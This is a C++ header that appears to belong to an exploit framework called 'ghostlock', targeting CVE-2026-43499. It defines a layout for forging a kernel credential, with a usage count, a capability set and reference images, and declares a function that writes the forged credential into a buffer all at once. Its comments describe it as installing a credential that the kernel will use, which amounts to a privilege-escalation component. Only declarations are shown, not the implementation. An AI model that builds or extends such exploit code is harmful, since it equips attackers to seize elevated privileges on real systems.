#pragma once
/** @file memory/credential_image.hpp
 *  Building the credential a write puts in place.
 *
 *  A credential write does not clear a field, it installs a whole one: a usage
 *  count, a capability set and the reference images, laid out at the offsets the
 *  profile declares and sized by the profile's own copy size. Every one of those
 *  numbers is an input; the retired tree kept the buffer size as a page-order
 *  constant and this one does not.
 *
 *  The layout is validated before anything is written, and the write is all or
 *  nothing: a credential that would not fit, or whose fields would fall outside
 *  the copy, leaves the buffer exactly as it was. A half-installed credential is
 *  worse than none, because the kernel will use it.
 */
#include <cstddef>
#include <cstdint>

namespace ghostlock::backend::cve_2026_43499::memory {
    /** How many reference slots the credential has; the tree's own number. */
    inline constexpr std::size_t kCredentialRefSlots = 4U;

    /** Everything the copy needs, from the profile -- no values of its own. */
    struct CredentialLayout final {
        /** How many bytes the credential occupies. */
        std::size_t copy_size = 0U;
        std::size_t usage_offset = 0U;
        std::uint32_t usage_value = 0U;
        std::size_t caps_offset = 0U;
        std::uint32_t caps_count = 0U;
        std::uint64_t caps_value = 0U;
        std::size_t ref_offset[kCredentialRefSlots] = {};
        std::uint64_t ref_image[kCredentialRefSlots] = {};
        /** How many of the slots the profile actually declares. */
        std::uint32_t ref_count = 0U;
    };

    /** Why a credential copy was refused. Names follow the single table. */
    enum class CredentialVerdict : unsigned char {
        Ok = 0,
        /** The credential would not fit where it is going. */
        NoRoom = 1,
        /** The copy size is zero or a field falls outside it. */
        LayoutInvalid = 2,
        /** More reference slots than the credential has. */
        TooManyReferences = 3,
    };

    [[nodiscard]] constexpr const char *credential_verdict_name(CredentialVerdict verdict) noexcept {
        switch (verdict) {
            case CredentialVerdict::Ok: return "ok";
            case CredentialVerdict::NoRoom: return "budget-exceeded";
            case CredentialVerdict::LayoutInvalid: return "tuning-missing";
            case CredentialVerdict::TooManyReferences: return "param-invalid";
        }
        return "unknown";
    }

    /** Write a credential into buffer at offset, sized by the layout. Nothing is
     *  written unless every check passes. */
    [[nodiscard]] CredentialVerdict build_credential_image(std::uint8_t *buffer,

                                                          std::size_t capacity,

                                                          const CredentialLayout &layout,

                                                          std::size_t offset) noexcept;
}  // namespace ghostlock::backend::cve_2026_43499::memory
